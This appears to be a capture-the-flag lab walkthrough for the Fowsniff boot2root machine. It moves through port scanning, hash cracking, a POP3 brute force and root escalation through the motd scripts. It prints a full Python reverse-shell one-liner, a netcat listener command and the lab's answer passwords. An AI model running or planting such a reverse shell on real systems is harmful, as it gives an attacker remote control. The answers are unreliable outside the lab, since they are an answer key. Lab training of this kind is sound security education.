

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are connected to our network

Credit to berzerk0 for creating this machine. This machine is used here with the explicit permission of the creator <3




Deploy the machine. On the top right of this you will see a Deploy button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
'''
no answer
'''


Using nmap, scan this machine. What ports are open?
'''
no answer
'''


Using the information from the open ports. Look around. What can you find?
'''
no answer
'''


Using Google, can you find any public information about them?
'''
no answer
'''


Can you decode these md5 hashes? You can even use sites like hashkiller to decode them.
'''
no answer
'''


Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
'''
no answer
'''


What was seina's password to the email service?
'''
scoobydoo2
'''


Can you connect to the pop3 service with her credentials? What email information can you gather?
'''
no answer
'''


Looking through her emails, what was a temporary password set for her?
'''
S1ck3nBluff+secureshell
'''


In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
'''
no answer
'''


Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
'''
no answer
'''


Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
'''
no answer
'''


Python Reverse Shell:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Other reverse shells: here.
'''
no answer
'''


If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in /etc/update-motd.d/ file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
'''
no answer
'''


Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
'''
no answer
'''


If you are really really stuck, there is a brilliant walkthrough here: https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

If its easier, follow this walkthrough with the deployed machine on the site.
'''
no answer
''

